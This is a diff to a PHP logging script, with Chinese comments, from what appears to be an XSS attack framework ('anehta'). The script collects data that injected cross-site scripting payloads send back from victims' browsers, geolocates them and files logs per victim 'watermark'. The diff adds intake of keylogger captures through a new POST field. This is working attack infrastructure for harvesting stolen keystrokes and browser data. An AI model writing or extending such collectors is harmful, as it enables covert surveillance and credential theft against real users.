@@ -19,7 +19,13 @@ $requestdate = date("m/d/Y H:i:s");
 $qstr = $_SERVER['QUERY_STRING'];  // XSS传回的数据
 
 if ($qstr == ""){ // logCache() POST 回来的数据
-	$qstr = $_POST['anehtaInput_anehtaPostLogger'];
+	//$qstr = $_POST['anehtaInput_anehtaPostLogger'];
+	if (!empty($_POST['anehtaInput_anehtaPostLogger'])){
+		$qstr = urldecode($_POST['anehtaInput_anehtaPostLogger']);
+	}
+	else if (!empty($_POST['anehtaInput_anehtaPostKeylog'])){
+		$qstr = urldecode($_POST['anehtaInput_anehtaPostKeylog']);
+	}	
 }
 
 //查询地理位置
@@ -58,10 +64,7 @@ if ( $slaveWatermark == false){ // 说明有水印
   // 分离出水印
   $slaveWatermark = strchr($qstr, "[**** Watermark: ");
   $slaveWatermark = strchr($slaveWatermark, "|");
-}
 
-// 如果没有打上水印,则为null,无法找到 "|"
-if ($slaveWatermark != false){
   $slaveWatermark = "Slave_".substr($slaveWatermark, 1, 13);  // 分离出watermark(随机的时间值)
   
   // 按水印分目录记录日志
@@ -78,6 +81,8 @@ if ($slaveWatermark != false){
   }
 }
 else { // 水印为null的
+	$slaveWatermark = "[**** Watermark: null ****]";
+	
 	// 如果是 logInfo()函数传回来的参数,如果为空则不记录
   $slave_logInfo = strchr($qstr, "[**** Info:  ****]");
   if($slave_logInfo == false){ // 说明Info 有信息;
